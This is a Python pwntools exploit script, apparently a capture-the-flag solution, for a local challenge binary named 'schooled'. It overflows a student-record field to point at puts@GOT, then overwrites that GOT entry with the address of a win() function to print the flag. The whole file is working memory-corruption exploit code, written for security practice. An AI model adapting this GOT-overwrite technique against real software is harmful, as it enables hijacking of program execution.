from pwn import *

# Addresses
win_addr = 0x08049316
puts_got = 0x0804c02c

context.log_level = 'debug'

# Test locally
p = process('./schooled')

# Step 1: Create student 0
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'?', b'TestName')
p.sendlineafter(b'?', b'12')
p.sendlineafter(b'?', b'3.5')

# Step 2: Modify student 0, option 1 - overwrite grade_ptr with puts@GOT
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'?', b'0')
p.sendlineafter(b'?', b'1')

# Payload: 36 bytes + puts@GOT address
payload = b'A' * 36 + p32(puts_got)
p.sendlineafter(b': ', payload)

# Step 3: Modify student 0, option 2 - write win address to puts@GOT
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'?', b'0')
p.sendlineafter(b'?', b'2')
p.sendlineafter(b': ', str(win_addr).encode())

# The next puts() call will jump to win() and print the flag
print("\n=== FLAG OUTPUT ===")
try:
    output = p.recvall(timeout=2).decode(errors='ignore')
    print(output)
except:
    print("No output received")

p.close()
